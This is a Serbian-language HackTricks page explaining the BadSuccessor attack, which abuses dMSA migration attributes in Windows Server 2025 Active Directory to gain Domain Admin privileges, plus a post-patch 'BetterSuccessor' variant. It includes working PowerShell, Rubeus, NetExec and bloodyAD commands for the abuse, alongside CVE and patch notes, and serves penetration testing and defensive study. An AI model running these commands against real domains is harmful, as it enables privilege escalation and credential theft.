# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

**BadSuccessor** zloupotrebljava tok migracije **delegated Managed Service Account** (**dMSA**) naloga, uveden u **Windows Server 2025**. dMSA može da se poveže sa starim nalogom pomoću atributa **`msDS-ManagedAccountPrecededByLink`** i da prolazi kroz stanja migracije koja se čuvaju u **`msDS-DelegatedMSAState`**. Ako napadač može da kreira dMSA u OU-u u koji može da upisuje i da kontroliše te atribute, KDC može da izda tikete za dMSA pod kontrolom napadača sa **autorizacionim kontekstom povezanog naloga**.<sup>[[2]](#references)</sup>

U praksi, to znači da korisnik sa niskim privilegijama koji ima samo delegirana prava nad OU-om može da kreira novi dMSA, poveže ga sa nalogom `Administrator`, dovrši stanje migracije, a zatim dobije TGT čiji PAC sadrži privilegovane grupe kao što je **Domain Admins**.<sup>[[2]](#references)</sup>

## Važni detalji migracije dMSA

- dMSA je funkcija **Windows Server 2025**.
- `Start-ADServiceAccountMigration` postavlja migraciju u stanje **started**.
- `Complete-ADServiceAccountMigration` postavlja migraciju u stanje **completed**.
- `msDS-DelegatedMSAState = 1` znači da je migracija započeta.
- `msDS-DelegatedMSAState = 2` znači da je migracija dovršena.
- Tokom legitimne migracije, predviđeno je da dMSA transparentno zameni prethodni nalog, pa KDC/LSA zadržavaju pristup koji je prethodni nalog već imao.<sup>[[3]](#references)</sup>

Microsoft Learn takođe navodi da se tokom migracije originalni nalog povezuje sa dMSA nalogom, a da je dMSA predviđen za pristup onome čemu je mogao da pristupi stari nalog.<sup>[[3]](#references)</sup> BadSuccessor zloupotrebljava ovu bezbednosnu pretpostavku.<sup>[[2]](#references)</sup>

## Zahtevi

1. Domen u kom **postoji dMSA**, što znači da je na AD strani dostupna podrška za **Windows Server 2025**.
2. Napadač može da **kreira** objekte `msDS-DelegatedManagedServiceAccount` u nekom OU-u ili ima ekvivalentna široka prava za kreiranje podređenih objekata u tom OU-u.
3. Napadač može da **upisuje** relevantne atribute dMSA naloga ili ima potpunu kontrolu nad dMSA nalogom koji je upravo kreirao.
4. Napadač može da zatraži Kerberos tikete iz konteksta pridruženog domenu ili preko tunela koji omogućava pristup LDAP-u/Kerberos-u.<sup>[[2]](#references)</sup>

### Praktične provere

Najjednostavniji signal za operatera jeste da proveri nivo domena/šume i potvrdi da okruženje već koristi novi Server 2025 stek:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Ako vidite vrednosti kao što su `Windows2025Domain` i `Windows2025Forest`, proveru zloupotrebe **BadSuccessor / dMSA migration abuse** postavite kao prioritet.

Možete i da enumerišete OU-ove u kojima je delegirano kreiranje dMSA naloga i u koje možete da upisujete, koristeći javno dostupne alate:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Tok zloupotrebe

1. Kreirajte dMSA u OU-u u kojem imate delegirana prava za kreiranje podređenih objekata.
2. Podesite **`msDS-ManagedAccountPrecededByLink`** na DN privilegovanog cilja, kao što je `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Podesite **`msDS-DelegatedMSAState`** na `2` da biste označili da je migracija završena.
4. Zatražite TGT za novi dMSA i upotrebite dobijenu kartu za pristup privilegovanim servisima.<sup>[[2]](#references)</sup>

PowerShell primer:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Primeri zahteva za tiket / operativnih alata:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Zašto je ovo više od Privilege escalation

Tokom legitimne migracije, Windows-u je takođe potreban novi dMSA da bi obradio tikete izdate za prethodni nalog pre prelaska. Zato materijal za tikete povezane sa dMSA može da sadrži **trenutne** i **prethodne** ključeve u toku **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Kod lažne migracije koju kontroliše napadač, takvo ponašanje može da pretvori BadSuccessor u:<sup>[[2]](#references)</sup>

- **Privilege escalation** nasleđivanjem SID-ova privilegovanih grupa u PAC-u.
- **Izlaganje materijala za akreditive**, jer obrada prethodnog ključa u ranjivim tokovima rada može da izloži materijal ekvivalentan RC4/NT hash-u prethodnog naloga.

Zbog toga je ova tehnika korisna i za direktno preuzimanje domena i za naknadne operacije kao što su pass-the-hash ili šire kompromitovanje akreditiva.

## BetterSuccessor nakon zakrpe KDC-a

Zakrpljeni KDC proverava obe strane migracije dMSA naloga. Pored `msDS-ManagedAccountPrecededByLink` i stanja migracije za dMSA, prethodni nalog mora da pokazuje nazad na dMSA preko `msDS-SupersededManagedAccountLink` i da ima kompatibilno stanje `msDS-SupersededServiceAccountState`. Jednosmerna veza više ne prolazi; nalog koji može samo da kreira dMSA ne može da navede proizvoljan prethodni nalog. Napadač koji ima `CreateChild` za dMSA u OU-u **i** efektivna prava pisanja nad atributima migracije izabranog ciljnog naloga može da uspostavi uzajamnu vezu. Dobijeni dMSA tiket može da prenese kontekst autorizacije prethodnog naloga i da izloži njegove ključeve u paketu ključeva dMSA naloga. Ovo je ciljani put za pristup akreditivima i pojačavanje privilegija, a ne dokaz da je originalni BadSuccessor sa proizvoljnim ciljem i dalje iskoristiv na zakrpljenim DC-ovima.<sup>[[5]](#references)[[6]](#references)</sup>

U laboratorijskom okruženju u kom je potvrđeno pravo pisanja nad ciljnim nalogom, `bloodyAD` može da kreira dMSA i da izvrši uparene upise migracije. Zatražite dMSA tiket koristeći vraćene Kerberos podatke i proverite stvarna prava ciljnog naloga pre nego što pretpostavite da su privilegije ili hash naloga vraćeni. Naziv podkomande `badSuccessor` u alatu ne podrazumeva nezakrpljeno jednosmerno ponašanje.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Napomene o statusu zakrpe

Originalno ponašanje BadSuccessor nije **samo teorijski problem iz pregleda za 2025. godinu**. Microsoft mu je dodelio oznaku **CVE-2025-53779** i objavio bezbednosno ažuriranje u **avgustu 2025.**<sup>[[4]](#references)</sup> Ovaj napad treba da ostane dokumentovan za:

- **laboratorije / CTF-ove / vežbe assume-breach**
- **nezakrpljena okruženja Windows Server 2025**
- **proveru delegacija OU-a i izloženosti dMSA tokom procena**

Nemojte pretpostaviti da je domen Windows Server 2025 ranjiv samo zato što postoji dMSA; proverite nivo zakrpa i pažljivo testirajte.

## Alati

- [Akamai BadSuccessor alati](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` modul](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Zloupotreba BadSuccessor dMSA za sticanje Domain Admin privilegija (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Zloupotreba dMSA za eskalaciju privilegija u Active Directory-ju](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Pregled Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor je mrtav, živeo BadSuccessor(?) ](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: I dalje zloupotreba dMSA nakon zakrpe](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
